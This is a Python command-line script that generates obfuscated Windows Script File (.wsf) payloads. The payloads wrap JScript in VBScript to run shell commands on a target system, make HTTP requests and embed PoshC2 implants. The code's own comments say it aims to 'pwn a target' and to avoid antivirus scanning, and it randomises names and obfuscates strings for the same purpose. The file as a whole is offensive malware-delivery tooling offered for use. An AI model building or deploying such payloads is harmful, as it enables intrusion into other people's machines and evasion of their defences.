from functions import js, payload
import optparse
import logging
import sys


def main(options):
    logging.basicConfig(stream=sys.stdout, level=logging.DEBUG if options.debug else logging.INFO)
    logger = logging.getLogger("VBJSX")
    payload_data = ""
    logger.info("Starting payload generation")
    item_web = options.http_entry
    item_shell = options.shell_entry
    obfus = False if options.no_obfus else "random"
    # framework for HTTP/HTTPS calls
    if options.web:
        logger.debug("Including function %s for web scripting" % item_web)
        payload_data += js.get_request(item_web, obfus=obfus)

    # shell execute + return results
    if options.cmd or options.cmd_ext:
        logger.debug("Including function %s for shell execution" % item_shell)
        payload_data += js.shell_execute(item_shell, obfus=obfus)

    if not options.cmd and not options.template and not options.posh:
        logger.error("You need to use at least one of the following parameters: cmd, posh-js-file, template")
        sys.exit(1)

    # randomize entry point for JavaScript code
    entry = payload.rand_str(8) if not options.js_entry else options.js_entry
    logger.debug("Using %s as JScript start entry-point" % entry)
    entry_data = ""

    # Run command on target
    if options.cmd:
        entry_data += "%s(%s);" % (item_shell, js.obfuscator.string(options.cmd, ob_type=obfus))

    # Execute a JScript template file
    if options.template:
        with open(options.template, 'r') as template_file:
            logger.debug("Adding %s to payload" % options.template)
            tfile = template_file.read()
            entry_data += tfile

    # Run POSH code to automatically pwn a target
    if options.posh:
        logger.debug("Adding %s to payload" % options.posh)
        entry_data += js.invoke_posh(options.posh, obfus=obfus)

    # The main javascript function that is getting called from VBScript
    # Directly executing JScript causes AV's to scan the code as JavaScript (which is bad)
    payload_data += """
    function %s(){
        %s
    }
    """ % (entry, entry_data)

    # Generate the payload XML data and write to file
    output = payload.get_code(payload_data, entry, caller_name=options.vb_caller, job_name=options.wsf_job)
    outfile = options.output if options.output else 'output.wsf'
    with open(outfile, 'w') as f:
        f.write(output)
        logger.info("Wrote %d bytes to output file %s" % (len(output), outfile))


if __name__ == "__main__":
    parser = optparse.OptionParser()
    parser.add_option("-o", "--output", dest="output", default=None,
                      help="Output to file (default: output.wsf)")

    parser.add_option("--no-obfuscate", dest="no_obfus", default=False,
                       action="store_true", help="Do not obfuscate strings (also disables obfuscation in the POSH payload)")

    parser.add_option("-c", "--cmd", dest="cmd", default=None,
                       help="Run a command on the target system (enables cmd shell extension)")

    parser.add_option("--cmd-ext", dest="cmd_ext", default=False, action="store_true",
                      help="Enable CMD shell extension (useful for templates)")

    parser.add_option("-w", "--web", dest="web", default=None, action="store_true",
                       help="Allows http(s) requests using Microsoft.XmlHTTP")

    parser.add_option("-p", "--posh-js-file", dest="posh", default=None,
                       help="Path to PoshC2 DotNet2JS.js file (works great)")

    parser.add_option("-t", "--template", dest="template", default=None,
                       help="Custom Javascript template")

    parser.add_option("-v", dest="debug", default=False, action="store_true",
                      help="Print debug messages")

    group = parser.add_option_group("String options")
    group.add_option("--entry-point", help="The Payload entry point (default: random)", dest="js_entry", default=None)
    group.add_option("--shell-name", help="Name of the shell module (default: shell)", dest="shell_entry", default="shell")
    group.add_option("--http-name", help="Name of the HTTP module (default: http)", dest="http_entry", default="http")
    group.add_option("--vb-pointer", help="Name of VBCode main function (default: random)", dest="vb_caller", default=None)
    group.add_option("--job-name", help="Name of the WSF job (default: random)", dest="wsf_job", default=None)

    options, args = parser.parse_args()
    main(options)
